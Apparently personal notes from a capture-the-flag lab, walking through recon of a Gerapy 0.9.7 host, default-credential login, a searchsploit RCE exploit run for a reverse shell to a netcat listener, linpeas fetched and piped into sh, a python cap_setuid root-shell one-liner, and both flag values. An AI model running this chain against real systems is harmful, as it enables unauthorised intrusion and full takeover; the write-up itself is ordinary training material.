Given IP target: 192.168.236.24

# Recon 
rustscan -a 192.168.236.24
	PORT     STATE SERVICE  REASON
	22/tcp   open  ssh      syn-ack
	8000/tcp open  http-alt syn-ack

Making rustscan more efficient
	sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a 192.168.236.24
```
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1 -a'
```

nmap -p22,8000 -T5 -sC -sV -oN services.txt 192.168.236.24
	PORT     STATE SERVICE  VERSION
	22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
	|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
	8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
	|_http-cors: GET POST PUT DELETE OPTIONS PATCH
	|_http-server-header: WSGIServer/0.2 CPython/3.10.6
	|_http-title: Gerapy
	| fingerprint-strings: 
	|   FourOhFourRequest: 
	|     HTTP/1.1 404 Not Found
	|     Date: Wed, 01 Nov 2023 07:05:06 GMT
	|     Server: WSGIServer/0.2 CPython/3.10.6
	|     Content-Type: text/html
	|     Content-Length: 9979
	|     Vary: Origin

dirb http://192.168.236.24:8000/
	http://192.168.236.24:8000/admin
		![[Pasted image 20231101091119.png]]

tried default password b4 hydra brute
	admin:admin
		![[Pasted image 20231101091905.png]]
# Weaponization 

nc prep
	hostname -I
		192.168.45.198
	nc -nlvp 4444

Now check version number in searchsploit
	searchsploit Gerapy 0.9.7 
		----------------------------------------------- ---------------------------------
		 Exploit Title                                 |  Path
		----------------------------------------------- ---------------------------------
		Gerapy 0.9.7 - Remote Code Execution (RCE) (Au | python/remote/50640.py
		----------------------------------------------- ---------------------------------
		Shellcodes: No Results
		Papers: No Results
	searchsploit -p python/remote/50640.py
		  Exploit: Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50640
     Path: /usr/share/exploitdb/exploits/python/remote/50640.py
     cp /usr/share/exploitdb/exploits/python/remote/50640.py .
    python 50640.py -h
	    options:
	  -h, --help            show this help message and exit
	  -t URL, --target URL  Target IP
	  -p TARGET_PORT, --port TARGET_PORT Target port
	  -L LOCALHOST, --lh LOCALHOST Listening IP
	  -P LOCALPORT, --lp LOCALPORT  Listening port
	  python 50640.py -t 192.168.236.24 -p 8000 -L 192.168.45.198 -P 4444

Gotem
![[Pasted image 20231101093906.png]]
# Priv Esc

Local User flag
	cd /home
	ls
	app
	bash
	sh
	ls
	app
	cd app
	ls
	gerapy
	local.txt
	logs
	run.sh
	snap
	cat local.txt
	725a521383502b6af10cf6e567496b0a


Ran linpeas
	curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
		95% success highlighted line
			/usr/bin/python3.10 cap_setuid=ep 
				python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'

I'm root
![[Pasted image 20231101094557.png]]
f26da5197f59ea010af2023648261201

